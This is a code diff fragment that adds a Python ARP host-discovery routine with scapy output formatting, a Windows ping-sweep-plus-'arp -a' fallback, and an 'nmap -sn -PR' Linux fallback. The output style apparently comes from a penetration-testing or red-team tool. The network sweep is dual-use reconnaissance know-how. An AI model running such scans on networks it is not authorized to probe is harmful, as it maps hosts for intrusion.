+        lines = [f"  {'IP ADDRESS':<18} MAC ADDRESS"]
+        lines.append("  " + "─" * 40)
+        for _, rcv in ans:
+            lines.append(f"  {rcv.psrc:<18} {rcv.hwsrc}")
+        return "\n".join(lines)
+    except ImportError:
+        pass
+
+    # ── Windows fallback: ARP cache + ping sweep to populate it ───────────
+    if sys.platform == "win32":
+        hosts = list(network.hosts())[:256]
+        import concurrent.futures
+        def _ping(ip):
+            subprocess.run(["ping", "-n", "1", "-w", "200", str(ip)],
+                           capture_output=True, timeout=2)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
+            list(ex.map(_ping, hosts))
+        arp_out = _shell_exec("arp -a 2>&1")
+        # Filter to only IPs in our target subnet
+        lines = [f"[*] ARP cache entries for {cidr}:"]
+        for line in arp_out.splitlines():
+            for ip in hosts:
+                if str(ip) in line:
+                    lines.append(f"  {line.strip()}")
+                    break
+        return "\n".join(lines) if len(lines) > 1 else f"[-] No ARP entries found for {cidr}"
+
+    # ── Linux fallback: nmap ARP ping ─────────────────────────────────────
+    if shutil.which("nmap"):
+        return _shell_exec(f"nmap -sn -PR {cidr} 2>&1")
+
+    return "[-] No ARP scanning tool found (install arp-scan, scapy, or nmap)"
